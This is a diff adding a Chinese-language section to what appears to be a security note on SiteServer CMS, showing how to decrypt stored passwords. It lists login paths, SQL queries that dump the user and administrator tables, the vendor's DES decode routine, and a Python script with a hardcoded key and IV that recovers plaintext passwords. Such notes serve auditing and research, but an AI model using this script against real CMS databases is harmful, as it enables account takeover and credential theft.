@@ -43,3 +43,100 @@
 - SecurityKey：加密秘钥，系统随机生成
 - Database:Type：数据库类型
 - Database:ConnectionString：数据库连接字符串
+
+### 数据库用户密码表解密
+
+#### 前台用户表：
+
+前台登录地址: 
+http://x.x.x.x/home/pages/login.html
+
+`SELECT * FROM jxxt.dbo.siteserver_User`
+
+#### 后台管理员表
+
+后台登录地址：
+http://x.x.x.x/SiteServer/pageLogin.cshtml
+
+`SELECT * FROM jxxt.dbo.siteserver_Administrator`
+
+对应的解密代码：
+
+https://github1s.com/siteserver/cms/blob/siteserver-v6.13.0/SiteServer.CMS/Provider/AdministratorDao.cs#L1126
+
+
+```
+        private string DecodePassword(string password, EPasswordFormat passwordFormat, string passwordSalt)
+        {
+            var retVal = string.Empty;
+            if (passwordFormat == EPasswordFormat.Clear)
+            {
+                retVal = password;
+            }
+            else if (passwordFormat == EPasswordFormat.Hashed)
+            {
+                throw new Exception("can not decode hashed password");
+            }
+            else if (passwordFormat == EPasswordFormat.Encrypted)
+            {
+                var encryptor = new DesEncryptor
+                {
+                    InputString = password,
+                    DecryptKey = passwordSalt
+                };
+                encryptor.DesDecrypt();
+
+                retVal = encryptor.OutString;
+            }
+            return retVal;
+        }
+```
+
+通过passwordSalt初始化DecryptKey值，进行DES解密，调用DesEncryptor.DesDecrypt()方法
+
+
+```
+		public void DesDecrypt()
+		{
+		    byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
+		    try
+			{
+				var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8));
+				var des = new DESCryptoServiceProvider();
+				var inputByteArray = Convert.FromBase64String(_inputString);
+				var ms = new MemoryStream();
+				var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write);
+				cs.Write(inputByteArray, 0, inputByteArray.Length);
+				cs.FlushFinalBlock();
+				Encoding encoding = new UTF8Encoding();
+				_outString = encoding.GetString(ms.ToArray());
+			}
+			catch (Exception error)
+			{
+				_noteMessage = error.Message;
+			}
+		}
+```
+
+对用python3代码：
+
+```
+import base64,pyDes
+
+def sscms_decrypt(encodeData):
+    var1 = encodeData.replace("0secret0", "").replace("0add0", "+").replace("0equals0", "=").replace("0and0", "&").replace("0question0", "?").replace("0quote0", "'").replace("0slash0", "/")
+    var2 = base64.b64decode(var1)
+    print("[+] Current Encrypt Data= " + var1)
+    secretKey = 'Y2MlWp4hGY2Wcb9tzIiR2w=='[0:8]
+    print("[+] secretKey= " + secretKey)
+    iv_hex = "1234567890abcdef"
+    iv = bytes.fromhex(iv_hex)
+    print("[+] iv_hex= " + iv_hex)
+    k = pyDes.des(secretKey, pyDes.CBC, iv, pad=None, padmode=pyDes.PAD_PKCS5)
+    return k.decrypt(var2) + b"\n"
+
+Data = "VpGCBufzbT+j/zYDjDmtWw=="
+
+print(sscms_decrypt(Data).decode("utf-8"))
+```
+
